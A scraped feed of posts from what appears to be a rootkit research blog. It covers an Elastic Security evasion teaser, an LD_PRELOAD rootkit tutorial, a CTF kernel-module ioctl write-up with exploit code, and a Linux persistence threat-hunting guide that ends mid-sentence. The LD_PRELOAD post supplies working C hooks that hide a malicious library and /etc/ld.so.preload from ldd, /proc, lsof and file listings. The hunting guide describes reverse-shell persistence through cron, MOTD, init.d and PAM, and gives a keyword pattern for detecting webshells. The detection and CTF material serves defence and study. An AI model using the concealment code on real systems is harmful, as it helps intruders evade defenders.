Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse 